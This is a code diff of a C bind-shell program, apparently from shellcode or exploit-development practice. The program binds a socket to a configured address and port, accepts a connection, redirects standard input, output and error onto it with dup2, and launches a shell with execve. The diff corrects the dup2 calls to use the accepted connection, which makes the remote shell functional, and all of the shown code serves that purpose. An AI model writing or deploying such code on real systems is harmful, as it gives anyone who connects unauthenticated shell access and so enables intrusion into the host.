@@ -33,17 +33,17 @@ int main (int argc, char * argv[]) {
     my_sockaddr.sin_port = htons(port);                           //   Port
     my_sockaddr.sin_addr.s_addr = inet_addr(ip_address);          //   IP Address
 
-	bind(my_socket, (struct sockaddr *) &my_sockaddr,             //<- Bind the Connnection data to the socket,
-	     sizeof(my_sockaddr));
+    bind(my_socket, (struct sockaddr *) &my_sockaddr,             //<- Bind the Connnection data to the socket,
+	 sizeof(my_sockaddr));
 	
-	listen(my_socket, MAX_CONNECTIONS);                           //<- Listen incoming connections for the socket
+    listen(my_socket, MAX_CONNECTIONS);                           //<- Listen incoming connections for the socket
 	
-	fd_accepted_connection = accept(my_socket, NULL, NULL);       //<- Accept incoming connection. Srtop until a connection in
-	                                                              // &client and &sockaddr_len can be NULL
-
-    dup2(my_socket, 0);                                           //<- Duplicate STDIN, STDOUT and STDERR
-    dup2(my_socket, 1);                                           //   to make the shell output be redirected
-    dup2(my_socket, 2);                                           //   to the socket
+    fd_accepted_connection = accept(my_socket, NULL, NULL);       //<- Accept incoming connection. Srtop until a connection in
+	                                                          // &client and &sockaddr_len can be NULL
+	
+    dup2(fd_accepted_connection, 0);                              //<- Duplicate STDIN, STDOUT and STDERR
+    dup2(fd_accepted_connection, 1);                              //   to make the shell output be redirected
+    dup2(fd_accepted_connection, 2);                              //   to the socket
 
     execve(shell_to_exec, execve_params, NULL);                   //<- EXECVE syscall
 
